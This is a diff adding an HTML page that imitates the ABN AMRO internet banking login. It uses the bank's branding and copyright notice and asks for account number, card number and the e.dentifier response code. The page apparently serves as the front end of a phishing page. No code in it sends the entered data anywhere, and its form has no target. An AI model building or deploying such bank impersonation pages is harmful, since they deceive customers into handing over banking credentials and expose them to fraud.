@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internet Bankieren - ABN AMRO</title>
+    <link rel="stylesheet" href="abnamro.css">
+    <link rel="icon" type="image/png" href="abn logo's/abnfavicon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="top-bar">
+            <div class="left">
+                <img src="abn logo's/abnamro.svg" alt="ABN AMRO Logo" class="logo">
+            </div>
+            <div class="right">
+                <span class="language-option nl">NL</span> | <span class="language-option en">EN</span>
+            </div>
+        </div>
+    </header>
+    <main>
+        <div class="login-container">
+            <div class="tab-container">
+                <button id="priveTab" class="tab active" onclick="switchTab('prive')">Prive</button>
+                <button id="zakelijkTab" class="tab" onclick="switchTab('zakelijk')">Zakelijk</button>
+                <div class="tab-line"></div>
+                <div class="tab-indicator"></div>
+            </div>
+            <h1>Log in met e.dentifier</h1>
+            <form>
+                <label for="rekeningnummer">Rekening- en pasnummer</label>
+                <div class="input-container">
+                    <div class="input-wrapper rekeningnummer">
+                        <span class="prefix">NL ** ABNA 0</span>
+                        <input type="text" id="rekeningnummer" name="rekeningnummer" required placeholder=" " maxlength="9">
+                    </div>
+                    <div class="input-wrapper pasnummer">
+                        <input type="text" id="pasnummer" name="pasnummer" required placeholder=" " maxlength="3">
+                    </div>
+                </div>
+            
+                <div class="remember-checkbox">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Onthoud rekening- en pasnummer</label>
+                </div>
+            
+                <label for="response">Respons</label>
+                <input type="text" id="response" name="response" class="input-field" placeholder="" required maxlength="8">
+                
+                <button type="submit" class="login-button">Inloggen</button>
+            </form>
+            <div class="button-line"></div> <!-- Toegevoegde lijn -->
+            
+            <!-- Hulp knop onder de lijn -->
+            <div class="help-container">
+                <button id="helpButton">
+                    Hulp nodig bij het inloggen
+                </button>
+                <div id="helpText" class="hidden">
+                    <p>Inloggen met een e.dentifier:</p>
+                    <p>1. Doe uw pas in de e.dentifier</p>
+                    <p>2. Druk op ‘1’ voor inloggen</p>
+                    <p>3. Toets de pincode van uw pas in + OK</p>
+                    <p>4. Vul de respons van de e.dentifier hierboven in</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-left">
+            <span class="footer-item"><b>NL</b></span> |
+            <span class="footer-item">EN</span> 
+            <span class="footer-item">Veilig bankieren</span> |
+            <span class="footer-item">Toegankelijkheid</span> |
+            <span class="footer-item">Privacy en cookies</span> |
+            <span class="footer-item">Disclaimer</span>
+        </div>
+        <div class="footer-center">
+            <!-- Your center content here -->
+        </div>
+        <div class="footer-right">
+           <p>&copy; ABN AMRO</p>
+        </div>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Alleen cijfers toestaan in de velden
+            const rekeningnummer = document.getElementById('rekeningnummer');
+            const pasnummer = document.getElementById('pasnummer');
+            const response = document.getElementById('response');
+
+            rekeningnummer.addEventListener('input', function(event) {
+                this.value = this.value.replace(/[^0-9]/g, ''); // Verwijder alle niet-cijfers
+            });
+
+            pasnummer.addEventListener('input', function(event) {
+                this.value = this.value.replace(/[^0-9]/g, ''); // Verwijder alle niet-cijfers
+            });
+
+            response.addEventListener('input', function(event) {
+                this.value = this.value.replace(/[^0-9]/g, ''); // Verwijder alle niet-cijfers
+            });
+        });
+
+        function switchTab(tab) {
+            const indicator = document.querySelector('.tab-indicator');
+            if (tab === 'prive') {
+                indicator.style.left = "0%";
+            } else {
+                indicator.style.left = "50%";
+            }
+        }
+
+        document.getElementById('helpButton').addEventListener('click', function() {
+        var helpText = document.getElementById('helpText');
+        helpText.classList.toggle('visible');
+        this.classList.toggle('rotate');
+    });
+    </script>
+</body>
+</html>
